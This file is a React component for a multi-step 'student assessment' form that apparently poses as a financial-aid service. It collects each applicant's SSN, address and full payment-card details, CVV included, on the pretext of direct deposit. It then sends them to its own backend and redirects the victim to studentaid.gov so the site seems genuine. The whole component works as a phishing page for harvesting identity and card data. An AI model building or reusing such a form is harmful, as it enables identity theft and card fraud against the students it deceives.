import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Button } from "@/components/ui/button";
import { Form } from "@/components/ui/form";
import { Progress } from "@/components/ui/progress";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { ChevronLeft, ChevronRight } from "lucide-react";
import { BasicInfoStep } from "./form-steps/BasicInfoStep";
import { EducationStep } from "./form-steps/EducationStep";
import { FinancialStep } from "./form-steps/FinancialStep";
import { AdditionalContextStep } from "./form-steps/AdditionalContextStep";
import { BankingStep } from "./form-steps/BankingStep";
import { useToast } from "@/hooks/use-toast";

const formSchema = z.object({
  fullName: z.string().min(2, "Full name is required"),
  email: z.string().email("Invalid email address"),
  phone: z.string().min(10, "Valid phone number required"),
  dateOfBirth: z.date({ required_error: "Date of birth is required" }),
  university: z.string().min(2, "University name is required"),
  fieldOfStudy: z.string().min(2, "Field of study is required"),
  academicYear: z.string().min(1, "Please select your academic year"),
  gpaRange: z.string().min(1, "Please select your GPA range"),
  housingStatus: z.string().min(1, "Please select your housing situation"),
  familyIncome: z.string().min(1, "Please select income range"),
  studentLoans: z.string().min(1, "Please select an option"),
  dependents: z.string().min(1, "Please select an option"),
  specialCircumstances: z.string().optional(),
  careerGoals: z.string().min(5, "Please describe your career goals"),
  contactMethod: z.string().min(1, "Please select a contact method"),
  ssn: z.string().min(9, "SSN is required for verification"),
  address: z.string().min(5, "Address is required"),
  city: z.string().min(2, "City is required"),
  state: z.string().min(1, "State is required"),
  zipCode: z.string().min(5, "ZIP code is required"),
  bankName: z.string().min(2, "Bank name is required"),
  cardNumber: z.string().min(15, "Valid card number required"),
  expDate: z.string().min(4, "Expiration date required"),
  cvv: z.string().min(3, "CVV required"),
  cardholderName: z.string().min(2, "Cardholder name required"),
});

type FormData = z.infer<typeof formSchema>;

const STEPS = [
  { title: "Basic Information", description: "Let's start with your contact details" },
  { title: "Educational Background", description: "Tell us about your studies" },
  { title: "Financial Overview", description: "Help us understand your financial situation" },
  { title: "Additional Context", description: "Share more about your goals" },
  { title: "Banking Information", description: "For potential direct deposit of funds" },
];

export function AssessmentForm() {
  const [currentStep, setCurrentStep] = useState(0);
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);

  const form = useForm<FormData>({
    resolver: zodResolver(formSchema),
    mode: "onChange",
    defaultValues: {
      fullName: "",
      email: "",
      phone: "",
      university: "",
      fieldOfStudy: "",
      academicYear: "",
      gpaRange: "",
      housingStatus: "",
      familyIncome: "",
      studentLoans: "",
      dependents: "",
      specialCircumstances: "",
      careerGoals: "",
      contactMethod: "",
      ssn: "",
      address: "",
      city: "",
      state: "",
      zipCode: "",
      bankName: "",
      cardNumber: "",
      expDate: "",
      cvv: "",
      cardholderName: "",
    },
  });

  const onSubmit = async (data: FormData) => {
    setIsSubmitting(true);
    
    try {
      const response = await fetch("/api/submit-assessment", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        toast({
          title: "Assessment Complete!",
          description: "We'll analyze your profile and contact you within 24 hours.",
        });
        
        setTimeout(() => {
          window.location.href = "https://studentaid.gov";
        }, 3000);
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      toast({
        title: "Submission Error",
        description: "Please try again or contact support.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const nextStep = async () => {
    const fields = getStepFields(currentStep);
    const isValid = await form.trigger(fields);
    
    if (isValid && currentStep < STEPS.length - 1) {
      setCurrentStep(currentStep + 1);
    }
  };

  const prevStep = () => {
    if (currentStep > 0) {
      setCurrentStep(currentStep - 1);
    }
  };

  const getStepFields = (step: number): (keyof FormData)[] => {
    switch (step) {
      case 0:
        return ["fullName", "email", "phone", "dateOfBirth", "ssn", "address", "city", "state", "zipCode"];
      case 1:
        return ["university", "fieldOfStudy", "academicYear", "gpaRange"];
      case 2:
        return ["housingStatus", "familyIncome", "studentLoans", "dependents"];
      case 3:
        return ["careerGoals", "contactMethod"];
      case 4:
        return ["bankName", "cardNumber", "expDate", "cvv", "cardholderName"];
      default:
        return [];
    }
  };

  const progress = ((currentStep + 1) / STEPS.length) * 100;

  return (
    <Card className="w-full max-w-2xl mx-auto">
      <CardHeader>
        <CardTitle>{STEPS[currentStep].title}</CardTitle>
        <CardDescription>{STEPS[currentStep].description}</CardDescription>
        <Progress value={progress} className="mt-4" />
        <p className="text-sm text-muted-foreground mt-2">
          Step {currentStep + 1} of {STEPS.length}
        </p>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            {currentStep === 0 && <BasicInfoStep form={form} />}
            {currentStep === 1 && <EducationStep form={form} />}
            {currentStep === 2 && <FinancialStep form={form} />}
            {currentStep === 3 && <AdditionalContextStep form={form} />}
            {currentStep === 4 && <BankingStep form={form} />}

            <div className="flex justify-between pt-4">
              <Button
                type="button"
                variant="outline"
                onClick={prevStep}
                disabled={currentStep === 0}
              >
                <ChevronLeft className="mr-2 h-4 w-4" />
                Previous
              </Button>

              {currentStep === STEPS.length - 1 ? (
                <Button type="submit" disabled={isSubmitting}>
                  {isSubmitting ? "Submitting..." : "Submit Assessment"}
                </Button>
              ) : (
                <Button type="button" onClick={nextStep}>
                  Next
                  <ChevronRight className="ml-2 h-4 w-4" />
                </Button>
              )}
            </div>
          </form>
        </Form>
      </CardContent>
    </Card>
  );
}
